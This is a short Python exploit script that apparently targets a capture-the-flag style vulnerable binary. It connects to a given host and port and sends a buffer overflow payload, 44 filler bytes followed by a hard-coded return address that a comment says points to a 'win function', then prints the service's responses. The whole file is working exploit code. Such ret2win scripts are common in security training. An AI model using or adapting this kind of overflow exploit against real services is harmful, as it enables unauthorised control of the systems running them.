import socket
import argparse
import struct

new_eip = struct.pack("<I",0x80491f6)

parser = argparse.ArgumentParser()
parser.add_argument(
        "host",
         type=str,
         help="The hostname or IP address to connect to",
)
parser.add_argument(
        "port",
        type=int,
        help="The port for the service to connect to",
)

args = parser.parse_args()

offset = 44
#payload = b"A" * offset + new_rip + b"\n"
new_eip = struct.pack("<I",0x80491f6) # win function within the vuln binary

payload = b"".join(
  [
   b"A" * 44,
   new_eip,
  ]

)

payload += b"\n"

with socket.socket() as connection:

    connection.connect((args.host, args.port))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))